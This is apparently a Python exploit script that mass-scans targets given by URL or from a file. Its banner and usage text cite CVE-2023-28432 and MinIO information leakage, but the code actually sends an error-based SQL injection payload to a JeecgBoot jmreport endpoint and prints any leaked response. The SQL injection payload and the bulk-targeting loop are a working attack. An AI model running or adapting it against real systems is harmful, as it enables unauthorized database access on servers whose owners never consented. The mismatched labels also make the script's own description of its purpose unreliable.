#!/usr/bin/env python
# -*- conding:utf-8 -*-
# minio 信息泄漏
# fofa app="minio"
import requests
import argparse
import sys
import urllib3
import json
from termcolor import cprint

urllib3.disable_warnings()
color = "green"


def title():
    cprint("""
  _____ __      __ ______          ___    ___   ___   ____           ___    ___   _  _    ____   ___  
 / ____|\ \    / /|  ____|        |__ \  / _ \ |__ \ |___ \         |__ \  / _ \ | || |  |___ \ |__ \ 
| |      \ \  / / | |__    ______    ) || | | |   ) |  __) | ______    ) || (_) || || |_   __) |   ) |
| |       \ \/ /  |  __|  |______|  / / | | | |  / /  |__ < |______|  / /  > _ < |__   _| |__ <   / / 
| |____    \  /   | |____          / /_ | |_| | / /_  ___) |         / /_ | (_) |   | |   ___) | / /_ 
 \_____|    \/    |______|        |____| \___/ |____||____/         |____| \___/    |_|  |____/ |____|                                                                                                    

                                                                                        Author:Henry4E36
               """, color)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        color = "red"
        payload = self.url + "/jeecg-boot/jmreport/qurestSql"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/json;charset=UTF-8"
        }
        data = {
            'apiSelectId': '1290104038414721025',
            'id': "1' or '%1%' like (updatexml(0x3a,concat(1,md5('123456'),1)) or '%%' like '"
        }
        proxies = {
            "http": "127.0.0.1:8080"
        }
        try:
            res = requests.post(url=payload, headers=headers, json=data, verify=False, timeout=5, proxies=proxies)
            if res.status_code == 200 and "e10adc3949ba59abbe56e057f20f883e" in res.text:
                cprint(f"[{chr(8730)}] 目标系统: {self.url} 存在信息泄漏!", color)
                print(res.text)
            else:
                print(f"[x] 目标系统: {self.url} 不存在信息泄漏")
        except Exception as e:
            print(f"[x] 目标系统: {self.url} 连接错误！")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='Minio 信息泄漏')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 CVE-2023-28432.py -u http://127.0.0.1\neg2:>>>python3 CVE-2023-28432.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()



